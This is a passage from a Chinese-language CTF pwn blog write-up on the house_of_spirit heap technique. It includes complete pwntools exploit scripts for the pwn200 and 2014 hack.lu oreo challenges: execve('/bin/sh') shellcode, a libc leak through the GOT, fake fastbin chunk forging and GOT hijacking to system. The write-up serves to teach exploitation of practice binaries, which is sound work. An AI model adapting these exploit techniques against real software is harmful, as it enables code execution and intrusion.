class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(b&#x27;node5.buuoj.cn&#x27;,25055)</span></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x400B1F\n b *0x400824\nb *0x400A5F\n b *0x40092C&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaa&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">b&#x27;who are u?\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;faaaaaaa&#x27;</span>)</span><br><span class="line">stack_addr = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(stack_addr)</span><br><span class="line">stack_addr=stack_addr[:<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_addr-------&gt;&#x27;</span>,stack_addr)</span><br><span class="line">stack_addr=<span class="built_in">int</span>.from_bytes(stack_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">ptr = stack_addr-<span class="number">0xf0</span>+<span class="number">0x40</span></span><br><span class="line">payload1 = <span class="string">b&#x27;48&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;give me your id ~~?\n&#x27;</span>,payload1)</span><br><span class="line"><span class="comment"># payload2构造fake_chunk</span></span><br><span class="line">payload2 = p64(<span class="number">0x0</span>)+p64(<span class="number">0x61</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(ptr)</span><br><span class="line"><span class="comment">#payload2 = b&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaa&#x27;#aaaahaaaaaaa&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;give me money~\n&#x27;</span>,payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;2&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice :&#x27;</span>,payload3)</span><br><span class="line">payload4 = <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice :&#x27;</span>,payload4)</span><br><span class="line">payload5 = <span class="string">b&#x27;80&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;how long?\n&#x27;</span>,payload5)</span><br><span class="line">a = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx,0x0068732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    mov rax,59</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">sh = a</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;--------&gt;&quot;</span>,<span class="built_in">len</span>(sh))</span><br><span class="line">payload6 = sh +<span class="string">b&#x27;a&#x27;</span>*<span class="number">3</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(ptr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;give me more money :&#x27;</span>,payload6)</span><br><span class="line">payload = <span class="string">b&#x27;3&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice :&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="house_of_spirit_level_2"><a class="markdownIt-Anchor" href="#house_of_spirit_level_2"></a> house_of_spirit_level_2</h2><ul><li>题目来源：2014 <a href="http://hack.lu">hack.lu</a> oreo,再次挑战该题，被这题薄纱了俩次QAQ</li><li>题目在该链接的github仓库有：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo</a></li><li>这题主要之前没打出来还是因为在Docker环境中这题不知道为什么在<code>exp</code>中<code>gdb.attach()</code>动态调试不了，不能边打边动调，就发现不了原因。然后之前的<code>house_of_spirit</code>也没理解到位。今天就不用Docker环境，直接在<code>ubuntu22.04</code>做了一下，发现也可以打<code>tcachebin</code>对这题没啥影响，所以就使用<code>ubuntu22.04</code>的环境进行动态试和打了。</li><li>又打了一下发现还是不行，还是要去Docker环境打，下次如果遇到Docker环境不能动调的，要去试试一下<code>patchelf</code>了</li></ul><h3 id="level_2分析1"><a class="markdownIt-Anchor" href="#level_2分析1"></a> level_2分析1</h3><ul><li>先来查看一下保护机制，发现是一个<code>32</code>位的程序，并且开启了<code>canary</code>保护，但是没有开启<code>PIE</code>和<code>RELRO</code>保护。所以可以修改<code>got</code>表</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128142901558.png" alt="image-20250128142901558"></p><ul><li>然后使用IDA对该二进制文件进行逆向分析。先来查看<code>main</code>函数。<code>main</code>函数的逻辑如下：<ul><li>先初始化了三个全局变量，其中<code>dword_804A2A4</code>和<code>dword_804A2A0</code>先初始化为<code>0</code></li><li><code>dword_804A2A7</code>指向的是<code>unk_804A2C0</code>的这个位置</li><li>之后输出字符串，之后执行一个函数，为了方便代码审计，将该函数命名为<code>func()</code></li><li>这边还要注意一个问题，这个程序并没有进行初始化输入输出，所以该程序并不是<code>0</code>缓冲。程序一开始会申请一个比较大的堆块作为缓冲区</li></ul></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128143338676.png" alt="image-20250128143338676"></p><ul><li>现在来查看一下<code>func()</code>这个函数中的内部。发现是一个堆菜单的和选项。<ul><li><code>switch()</code>函数这边调用了一个函数，用于输入选项，这里将其重新命名为<code>choose()</code>，其作用就是让用户选择操作对应的选项。</li><li>之后选项<code>1</code>就是<code>add</code>操作，所以将选项<code>1</code>所执行的函数命名为<code>add()</code>。选项<code>2</code>是<code>show</code>操作，所以将选项<code>2</code>所执行的函数命名为<code>show()</code></li><li>选项<code>3</code>对应的是<code>order</code>操作，将选项3执行的函数命名为<code>order()</code></li><li>选项<code>4</code>对应的是编辑一个<code>message</code>，所以将选项4执行的函数命名为<code>edit_message()</code></li><li>选项<code>5</code>对应的操作就是展示<code>add</code>和<code>order</code>的状态。所以将选项5执行的函数命名为<code>stats()</code>重命名的结果如下</li><li><code>choose()</code>函数的功能在下图</li></ul></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128144340893.png" alt="image-20250128144340893"></p><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128143700411.png" alt="image-20250128143700411"></p><ul><li>之后来查看一下<code>add</code>函数的具体功能<ul><li>首先有一个指针变量（全局变量存储在<code>.bss</code>）段，将该变量重新命名为<code>ptr</code>。该<code>ptr</code>会先把之前的值存储在<code>v1</code>中，然后该<code>ptr</code>会重新指向一个新申请的堆块（该堆块申请大小为<code>0x38</code>，实际上该堆块的<code>size</code>为<code>0x40</code>）。</li><li>申请成功后会像该堆块的<code>0x3c-0x3f</code>（算上chunk头）字节处存储存储着<code>v1</code>变量的值，即前一个申请堆块的地址。</li><li>之后会从该堆块的<code>0x21</code>（算上chunk头）字节处写入数据，作为<code>Rifle name:</code>，这里会存在一个溢出。会进行一个操作，将换行符变成<code>\x00</code>这个字符（这个是通过<code>sub_80485EC()</code>进行的操作）</li><li>之后会从该堆块的<code>0x8</code>（算上chunk头）字节处写入数据，作为<code> description:</code>，这里貌似也存在溢出，也可以修改指向前一个堆块的指针（不过用前面的就足够了）。写入后也会将末尾的换行符替换成<code>\x00</code>。</li><li>最后有一个全局变量会自增，方便查看程序，就将该全局变量重新命名为<code>Rifle_count</code>。</li></ul></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128145544517.png" alt="image-20250128145544517"></p><ul><li>从<code>add()</code>函数中就可以了解到我们所申请堆块的结构是向这样的。</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128151452204.png" alt="image-20250128151452204"></p><ul><li>接下来查看<code>show()</code>，这个<code>show()</code>函数会按照新申请的堆块到旧申请的堆块这样的一个顺序，逐条打印出<code>Rifle name</code>和<code>description</code></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128145614465.png" alt="image-20250128145614465"></p><ul><li>之后查看<code>order()</code>函数，该函数的执行流程如下：<ul><li>会将<code>ptr</code>指针的值赋值给<code>v1</code>，检查<code>Rifle_count</code>是否存在</li><li>当<code>Rifle_count</code>有的时候就会按照从新申请的堆块到旧申请的堆块这个顺序，逐个释放指针</li><li>之后<code>order_count</code>这个全局变量就会自增。</li></ul></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128150631463.png" alt="image-20250128150631463"></p><ul><li>查看一下<code>edit_message</code>函数，这个函数就会向<code>message_ptr</code>指向的地址读入<code>128</code>字节，最后还会调用<code>sub_80485EC()</code>将末尾的换行符修改为<code>\x00</code></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128150807408.png" alt="image-20250128150807408"></p><ul><li>之后查看一下<code>stats()</code>：<ul><li>这个函数就是输出<code>rifles</code>的状态，如果有<code>message_ptr</code>，也会输出该<code>message_ptr</code>所指向的值。</li></ul></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128150948664.png" alt="image-20250128150948664"></p><ul><li>逆向分析一遍程序后，我们再来查看<code>main</code>函数的4个全局变量，现在就比较清晰了</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128152952122.png" alt="image-20250128152952122"></p><h3 id="level_2分析2"><a class="markdownIt-Anchor" href="#level_2分析2"></a> level_2分析2</h3><ul><li>静态分析结束后，我们来进行动态调试。既然是<code>house_of_spirit</code>，所以我们一定是要通过溢出来修改我们的指针，使其指向我们伪造的堆块，这样就可以将伪造的堆块释放到这<code>fastbin</code>链表上面去。</li><li>由于这个函数没有后门函数，所以我们肯定是要去打<code>libc</code>。所以我们要先泄露一下<code>libc</code>的地址。我们可以先申请一个堆块，通过溢出修改<code>char_ptr</code>的值，使其指向<code>printf_got</code>表，这样我们就可以泄露<code>libc</code>的地址。在我们打印第二个堆块的<code>name</code>和<code>des</code>的时候我们接收到的<code>des</code>开头的几个字节就是<code>printf</code>函数的地址</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128151452204.png" alt="image-20250128151452204"></p><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128152339889.png" alt="image-20250128152339889"></p><ul><li><p>这样我们就把<code>libc</code>的地址泄露出来了，接下来就需要伪造一个堆块，然后将该堆块释放，使其能加入<code>fastbin</code>链表，之后我们就可以申请该堆块，对该堆块的内容进行任意修改。</p></li><li><p>这题伪造堆块的地方有两处。这俩处都在<code>.bss</code>段上，但是有一处伪造的堆块，我们之后申请该堆块是对我们后续没有用的。</p></li><li><p>这两处所在地方如下图所示。</p><ul><li>这两处其中<code>第一处</code>伪造比较麻烦，第二处刚好是我们<code>message</code>存储的地方，我们可以对该地方进行任意写的操作所以比较好伪造。</li><li>但是对后面的利用有用的其实要伪造<code>第一处</code>，因为第一处我们伪造释放后，重新申请回来，我们可以修改<code>message_ptr</code>的值，使其指向<code>got</code>表的地址，然后我们可以劫持某个函数的<code>got</code>表，将其修改为<code>system</code>函数的地址。这样就可以执行<code>system(&quot;/bin/sh&quot;)</code>从而<code>getshell</code>。而第二处</li></ul></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128153050604.png" alt="image-20250128153050604"></p><ul><li>所以我们就需要对<code>第一处</code>进行堆块的伪造，这样之后才能利用我们所申请的堆块。由于堆块的内存对齐机制，我们要从<code>0x804A2A0</code>开始伪造<code>prev_size</code>字段，这样才能满足对齐的要求。而我们申请的堆块<code>size</code>位都是<code>0x40</code>大小，所以我们要让我们伪造的堆块<code>size</code>位为<code>0x40</code>（这里最好是<code>0x40</code>）如果是<code>0x41</code>的话之后我们再申请一个堆块<code>size</code>位可能会变成<code>0x42</code>可能会造成程序的一些问题。</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128154516378.png" alt="image-20250128154516378"></p><ul><li>这时我们在泄露<code>libc</code>的地址后还要申请<code>0x3F</code>个堆块，我们在申请<code>0x3F</code>个堆块的时候就要通过溢出修改该<code>char_ptr</code>的值，使其指向我们伪造堆块的<code>用户使用的地址</code>，也就是<code>0x804A2A8</code>，我们要将我们伪造堆块中<code>char_ptr</code>的值要置为<code>0</code>。同时我们还要伪造与我们伪造堆块物理地址相邻且更高的堆块的<code>size</code>位。(这两个地方都比较好修改，因为都在<code>message</code>这个全局变量里面)</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128160512971.png" alt="image-20250128160512971"></p><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250128164609762.png" alt="image-20250128164609762"></p><ul><li>这样就将堆块伪造好了，这样我们释放的时候就可以绕过<code>free</code>的检查机制，将我们所伪造的堆块放入<code>fastbin</code>链表中，接下来我们将堆块释放后看看。（由于环境原因之后的动态调试调试不了，没办法贴图片了。）</li></ul><h3 id="level_2分析3"><a class="markdownIt-Anchor" href="#level_2分析3"></a> level_2分析3</h3><ul><li>接下来总结一下本题的利用思路：<ul><li>先通过溢出，修改指针，将指针修改为<code>printf_got</code>表的地址，然后通过<code>show()</code>将<code>printf</code>函数的地址给输出出来。从而达到泄露libc地址的作用</li><li>然后通过伪造堆块将<code>.bss</code>段的一部分作为<code>fake_chunk</code>，链到<code>fastbin</code>链表上。</li><li>申请该<code>fake_chunk</code>通过对申请到的<code>fake_chunk</code>写入数据，达到修改<code>message_ptr</code>的值。</li><li>最后通过<code>edit_message()</code>劫持<code>scanf_got</code>表（即将该其got表的值修改为<code>system</code>的地址），之后我们再发送<code>/bin/sh\x00</code>从而达到<code>system(&quot;/bin/sh&quot;)</code>的目的。这样我们就<code>getshell</code>了</li></ul></li></ul><h3 id="level_2_exp"><a class="markdownIt-Anchor" href="#level_2_exp"></a> level_2_exp</h3><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,des</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">submit</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendline(submit)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stats</span>():</span><br><span class="line">    p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x8048A25&#x27;)</span></span><br><span class="line"><span class="comment"># 泄露libc的地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(<span class="number">0x804A234</span>)</span><br><span class="line">add(payload,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Description:&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Description:&#x27;</span>)</span><br><span class="line">printf_addr = p.recvline()[<span class="number">1</span>:<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(printf_addr)</span><br><span class="line">printf_addr = <span class="built_in">int</span>.from_bytes(printf_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_addr))</span><br><span class="line">libc_addr = printf_addr - libc.symbols[<span class="string">b&quot;printf&quot;</span>]</span><br><span class="line">sys_addr = libc_addr + libc.symbols[<span class="string">b&quot;system&quot;</span>]</span><br><span class="line">sh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3e</span>):</span><br><span class="line">    add(<span class="string">b&#x27;a&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(<span class="number">0x804A2A8</span>)</span><br><span class="line">add(payload,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload = p32(<span class="number">0</span>)*<span class="number">8</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x40</span>)+p64(<span class="number">0</span>)*<span class="number">8</span></span><br><span class="line">submit(payload)</span><br><span class="line">pause()</span><br><span class="line">order()</span><br><span class="line">payload = p32(<span class="number">0x804A258</span>)</span><br><span class="line">add(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,payload)</span><br><span class="line">payload = p32(sys_addr)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#submit(payload)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><ul><li>在遇到<code>house_of_spirit</code>的时候要注意<ul><li>是否能通过溢出控制要free的地址</li><li>注意题目中的计数器</li><li>如果有多个地方可以伪造，注意伪造到哪个地方对后续有用。</li><li>注意伪造堆块的<code>size</code>位和<code>next_size</code>位。</li><li>还要注意程序逻辑，如果当程序释放完<code>fake_chunk</code>后还要再继续释放，可能就会出现问题，这时就要在<code>fake_chunk</code>中写入适当的数据，绕过程序逻辑。</li></ul></li></ul>]]></content>
    
    
    <summary type="html">前言：这个重新再牢一下，换一题牢，先不做oreo这题，动调不了主要是</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
</feed>
